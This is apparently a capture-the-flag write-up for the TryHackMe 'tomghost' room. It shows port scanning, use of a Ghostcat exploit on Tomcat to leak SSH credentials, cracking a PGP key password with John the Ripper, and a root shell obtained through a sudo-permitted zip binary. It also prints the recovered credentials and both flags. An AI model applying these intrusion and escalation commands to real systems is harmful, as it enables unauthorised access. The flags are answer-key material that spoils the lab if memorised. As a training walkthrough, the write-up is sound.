# tomghost

Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.

```
ip = 10.10.204.127
```

## Nmap
```
nmap -sC -sV -oN initial.log 10.10.204.127
```

>22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
>
>53/tcp   open  tcpwrapped
>
>8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
>
>8080/tcp open  http       Apache Tomcat 9.0.30


## Task 1.

```
nikto -h http://10.10.204.127 | tee nikto.log
```

Looking at the `nmap` result I observe that the machine is running `Apache Tomcat 9.0.30` on port 8080. Looking for vulnerabilities on that I find the script `vulnerability.py`. Running it I obtain the user and the password to access via ssh.

```
  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>
```

With those credentials I access the machine and retreive the first flag from `/home/merlin/user.txt`. With this user I have no root permissions, I try to gain access to `merlin` user to check if he has. In order to achieve this I find two files in `/home/skyfuck` folder. I transfer both files to my machine and I examine them. One is a encrypted PGP file, the other one is its key but it has a password. In order to obtain acces to the key and retreive the contents of the file I use JohnThe Ripper.

```
/snap/john-the-ripper/current/run/gpg2john tryhackme.asc > hashes-for-john.txt

/snap/john-the-ripper/current/run/john --wordlist=/usr/share/wordlists/rockyou.txt hashes-for-john.txt

alexandru        (tryhackme) 
```
Once I have the password I can decrypt the file.

```
gpg --import tryhackme.asc

gpg --decrypt credential.pgp

merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

Now with the credentials of `merlin` I connect using ssh. Investigating a bit I see that `merlin` can run with root privileges the `zip` binary. So, checking `https://gtfobins.github.io/gtfobins/zip/` I obtain root access and I finf the second key.

```
sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

## Questions

1. Compromise this machine and obtain user.txt
    >THM{GhostCat_1s_so_cr4sy}
2. Escalate privileges and obtain root.txt  
    >THM{Z1P_1S_FAKE}